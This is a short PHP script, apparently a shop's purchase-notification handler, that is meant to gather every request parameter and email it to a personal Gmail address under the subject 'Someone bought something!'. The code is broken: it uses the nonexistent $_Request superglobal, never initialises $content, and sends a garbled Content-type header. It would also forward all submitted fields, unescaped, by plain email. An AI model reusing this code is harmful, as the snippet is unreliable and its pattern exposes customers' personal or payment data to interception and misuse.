<?php 
foreach ($_Request as $key => $value){
    $content.= $key.' '.$value.'<br>';
};
mail("ryan13king@gmail.com", "Someone bought something!", $content, "Content-typetext:/html");
?>